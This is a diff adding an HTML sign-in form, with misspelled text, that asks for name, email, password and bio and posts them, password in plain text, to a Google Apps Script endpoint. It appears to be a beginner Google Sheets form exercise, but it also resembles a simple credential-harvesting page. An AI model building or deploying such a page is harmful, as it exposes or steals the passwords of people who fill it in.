@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+   <title>form</title>
+
+   <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+   <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+
+   <style>
+      html {
+         background-color: #080808;
+         color: #fff;
+         font-size: 18px;
+         text-align: center;
+         justify-content: center;
+         margin-top: 100px;
+      }
+
+      input {
+         width: 60vh;
+         height: 30px;
+         background-color: #e1e1e1;
+         border-radius: 2px;
+         border: none;
+         margin: 15px 10px;
+      }
+
+      .in {
+         margin-left: -30px;
+      }
+
+      textarea {
+         background-color: #e1e1e1;
+         border-radius: 2px;
+         border: none;
+         width: 60vh;
+         height: 10vh;
+         margin-left: 145px;
+         margin-top: 15px;
+      }
+
+      .inp {
+         width: 20vh;
+         margin: 40px;
+         padding: 5px;
+         transition: 0.5s
+      }
+
+      .inp:hover {
+         background-color: #9b0031;
+         color: #fff;
+         font-weight: bold;
+         width: 22vh;
+      }
+
+
+      .dis {
+         background: linear-gradient(to right, #ff004f, purple);
+         width: 100vh;
+         height: 50px;
+         margin-left: 50vh;
+         margin-top: -20px;
+         margin-bottom: 5vh;
+         justify-content: center;
+      }
+
+      @media only screen and (max-width: 600px) {
+
+         html {
+            font-size: 18px;
+            font-weight: 400;
+         }
+
+         input {
+            width: 90px;
+            height: 30px;
+         }
+
+         textarea {
+            margin-left: 0;
+            width: 120px;
+            height: 70px;
+         }
+
+         .dis {
+            margin: 0;
+            width: 300px;
+            margin-left: 47px;
+         }
+
+         .ema {
+            width: 150px;
+         }
+
+         .inp {
+            background-color: #ff004f;
+            color: #fff;
+            width: 100px;
+            height: inherit;
+         }
+
+      }
+
+      .inp {
+         background-color: #ff004f;
+         color: #fff;
+         width: 100px;
+         height: inherit;
+      }
+
+      .your {
+         position: relative;
+         top: -10px;
+         right: 10px;
+         color: green;
+      }
+   </style>
+</head>
+
+<body>
+
+   <header>
+      <div class="dis">
+         <div>
+            <strong>compelet the pag eto sign in to the sites!</strong>
+         </div>
+      </div>
+   </header>
+
+   <div class="div">
+      <form name="submit-to-google-sheet">
+         <div>
+            <label>write your name here</label>
+            <input name="Name" type="text" placeholder="your name" required>
+         </div>
+
+         <div>
+            <label>write your email here</label>
+            <input class="ema" name="Email" type="email" placeholder="jackande****@gmail.com" required>
+         </div>
+
+         <div class="in">
+            <label>write your password here</label>
+            <input name="Password" type="password" placeholder="your Password" required>
+         </div>
+
+         <div>
+            <label class="bio">bio</label>
+            <textarea name="Text" cols="30" rows="10" required></textarea>
+         </div>
+
+         <div>
+            <input onclick="yebar(true)" class="inp" type="submit" name="submit" placeholder="regester"
+               href="index.html">
+            <input class="inp" type="reset">
+         </div>
+         <span id="msg" class="your"></span>
+      </form>
+   </div>
+
+   <script>
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbyxaEcGJvRdnB8NPJWKlqzREfrGmao_yahD70-7l_7v3GOHsSofyAA7PhtErbTny-hr/exec'
+      const form = document.forms['submit-to-google-sheet']
+
+      form.addEventListener('submit', e => {
+         e.preventDefault()
+         fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+      })
+   </script>
+
+</body>
+
+</html>
